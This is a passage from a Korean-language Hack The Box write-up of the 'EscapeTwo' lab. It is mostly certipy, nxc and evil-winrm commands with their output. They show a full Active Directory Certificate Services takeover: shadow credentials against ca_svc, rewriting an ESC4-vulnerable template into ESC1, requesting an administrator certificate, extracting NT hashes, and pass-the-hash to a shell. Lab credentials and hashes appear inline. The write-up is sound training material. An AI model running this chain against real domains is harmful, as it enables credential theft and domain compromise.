└─$ certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.129.11.237
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '5cb93ff52d554fde95a630d952738e62'
[*] Adding Key Credential with device ID '5cb93ff52d554fde95a630d952738e62' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '5cb93ff52d554fde95a630d952738e62' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce

```

 hash 확인
 ```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ nxc smb dc01.sequel.htb -u ca_svc -H '3b181b914e7a9d5508ea1e20bc2b7fce' --continue-on-success
SMB         10.129.11.237   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.11.237   445    DC01             [+] sequel.htb\ca_svc:3b181b914e7a9d5508ea1e20bc2b7fce 

 ```

취약한 템플릿을 찾기위해 ca_svc 계정으로 certipy-ad 실행

```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ certipy-ad find -vulnerable -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.11.237 -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC01-CA'
[*] Checking web enrollment for CA 'sequel-DC01-CA' @ 'DC01.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireCommonName
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-19T05:11:28+00:00
    Template Last Modified              : 2026-03-19T05:11:28+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Cert Publishers
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.

```


## ESC4 (ESC1 경유)
ca_svc가 템플릿에 대한 완전한 제어 권한을 가지고 있으므로, `certipy`다음 옵션을 사용하여 ESC1 취약점을 만들겠습니다.

```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration -no-save
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.
[!] Use -debug to print a stacktrace
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
[*] Successfully updated 'DunderMifflinAuthentication'
                                                           

```

수정된 템플릿을 사용하여 도메인 관리자 인증서를 요청
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```
인증서를 사용하면 auth 하위 명령이 해당 계정의 NTLM 해시를 가져옴

```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.11.237
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff

```

evil-winrm 접근 성공
```bash
┌──(kali㉿kali)-[~/HTB/EscapeTwo]
└─$ evil-winrm -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i dc01.sequel.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

root.txt 획득
![[Pasted image 20260319143108.png]]